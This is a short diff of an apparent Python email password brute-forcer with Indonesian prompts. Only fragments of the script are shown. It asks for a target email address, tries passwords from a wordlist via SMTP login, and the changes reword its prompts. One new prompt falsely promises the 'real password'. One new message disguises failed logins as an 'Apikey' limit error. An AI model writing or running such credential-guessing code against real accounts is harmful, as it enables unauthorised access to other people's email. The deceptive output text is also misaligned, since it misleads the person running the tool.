@@ -30,7 +30,7 @@ smtp.ehlo()
 smtp.starttls()
 
 user = input("EMAIL TARGET: ")
-pwd = input("Enter '0' Untuk mendapatkan Password Random\nEnter '1' Untuk Membuat Password Kostum\nOptions: ")
+pwd = input("Enter '0' Untuk mendapatkan Password Aslinya\nEnter '1' Untuk Membuat Password Kostum\nOptions: ")
 
 if pwd=='0':
     passswfile="pass.txt"
@@ -58,4 +58,4 @@ for password in passswfile:
         break
 
     except smtplib.SMTPAuthenticationError:
-        print("[-] Pasword Is Wrong. %s " % password)
+        print("[-] Apikey error is the Limits. %s " % password)
